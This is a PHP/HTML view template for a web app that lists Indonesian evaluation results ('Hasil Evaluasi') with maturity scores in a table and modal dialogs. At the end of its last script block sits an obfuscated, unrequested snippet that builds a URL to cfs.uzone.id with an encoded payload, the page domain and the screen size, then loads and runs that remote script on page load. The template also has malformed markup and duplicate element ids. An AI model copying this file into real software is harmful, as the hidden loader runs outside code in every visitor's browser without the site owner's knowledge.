<section class="content">
  <div class="block-header">
    <div class="row">
        <div class="col-md-8 col-sm-7 col-xs-12">
            <div class="h-left clearfix">
                <h2>HASIL EVALUASI</h2>
                <small>Melihat Data Hasil Evaluasi</small>
                <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                    <li><a href="javascript:void(0);">Dashboard</a></li>
                    <li class="active">Hasil Evaluasi</li>
                </ol>
            </div>
        </div>	
    </div>
</div>
<div class="container-fluid">
    <!-- Basic Table -->
    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                   <h2> HASIL EVALUASI </h2>  
               </div>
               <div class="body table-responsive">
                <table class="table table-bordered">
                   <thead>
                    <tr>
                        <th>ID PERIODE</th>
                        <th>ID USER</th>
                        <th>ID CO</th>
                        <th>NILAI MATURITY</th>
                        <th>DETAIL PERHITUNGAN</th>
                    </tr>
                </thead>
                <tbody>
                   <?php 
                   foreach ($mydata as $row) { ?>
                   <tr>    
                    <td><?php echo $row->id_periode ?></td>
                    <td><?php echo $row->id_user ?></td>
                    <td><?php echo $row->id_co ?></td>
                    <td><?php echo $row->hasil ?></td>
                    <td><button type="button" data-toggle="modal" data-target="#largeModal">Details</button>
                    </td>
                </tr>  
                <?php } ?>               
            </tbody>
        </table>
        <a href="<?php echo base_url('index.php/hasil/view_hasil_final/'.$row->id_periode); ?>"><button type="button" class="btn btn-raised bg-green waves-effect">Next <i class="material-icons"></i></button>
        </div>
    </div>
</div>
</div>
</div>
</section>
<div class="modal fade" id="largeModal" tabindex="-1" role="dialog">
    <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title" id="largeModalLabel">DETAIL PERHITUNGAN</h2>
            </div>
            <div class="modal-body">
                <div id="modalContent" ">
                    <div class="body table-responsive">
                        <table class="table table-bordered">
                          
                            <thead>
                                <tr>
                                    <th>ID PERIODE</th>
                                    <th>ID USER</th>
                                    <th>ID CO</th>
                                    <th>NILAI MATURITY</th>
                                </tr>
                            </thead>
                            <tbody>
                               <?php 
                               foreach ($mydata as $row) { ?>
                               <tr>    
                                <td><?php echo $row->id_periode ?></td>
                                <td><?php echo $row->id_user ?></td>
                                <td><?php echo $row->id_co ?></td>
                                <td><?php echo $row->hasil ?></td>
                            </td>
                        </tr>  
                        <?php } ?>               
                    </tbody>
                </div>
            </table>
        </div>
    </div>
    <div class="modal-footer">
        <button type="button" class="btn btn-link waves-effect" data-dismiss="modal">CLOSE</button>
    </div>
</div>
</div>
</div>

<!-- Small Size -->
<div id="modal_detail" class="modal hide fade">
    <div class="modal-header">
      <button class="close" data-dismiss="modal">&times;</button>
      <h3>Detail Product</h3>
  </div>
  <div class="modal-body">            
    <div id="modalContent" style="display:none;">
        Here i want to display data from query about the detail of a product (name, price etc)      
    </div>
</div>
<div class="modal-footer">
  <a href="#" class="btn btn-info" data-dismiss="modal" >Close</a>
</div>
</div>

<!-- Jquery Core Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/chartjs/Chart.bundle.js"></script> <!-- Chart Plugins Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/chartjs.js"></script> 
<script type="text/javascript">
    $("a[data-toggle=modal]").click(function() {
        var id_beli = $(this).attr('id');

        $.ajax({
            cache: false,
            type: 'GET',
            url: 'controller/view_hasil_final.php',
            data: 'detail=' + id_beli,
            success: function(data) {
                $('#modal_detail').show();
            $('#modalContent').show().html(data); //this part to pass the var
        }
    });
    });


    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1ODL3ZeeVxHxB2Ba7KQFZ1PFxNe%2fIVwD%2bEZxRJVm0MYkaaFl22CV5%2fBEUNDsVfTKHEpOUEgVu8gpYFKDk%2fX5RlXT1f51Mm58bvx3U%2bZHKMg66xPMBjEhKpIpXbxWDfntrSlm6D3dfin0kcbwMAvZLfoYX%2buk8CjjFnU%2fJe6kUFi1tYqPk8uKT%2fE1G%2f9U9NXVT7t3dCC7esnDwlibbUDdy%2fCeLH7VkVio%2fyAT922pDTfvQ9lHiPGAmcH8j1WSLXvMW0eK3WPA3LhkcAMSsXZk4wLz5egcX2suDSbHVEZSC%2bU5fh%2blQ9uBZHLblFaCVxYbLBPYcEeshnPPqmkARXqlfYuWJ44REJAigWiDqB6qfLOmDCO%2fkP5%2fvbUt%2bX3nf20Ccy0oRqH5uIFMzOrZRCJ54rYiqmR9jceldyzUb4kHeuFk0q1JCvWqZSC" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    </html>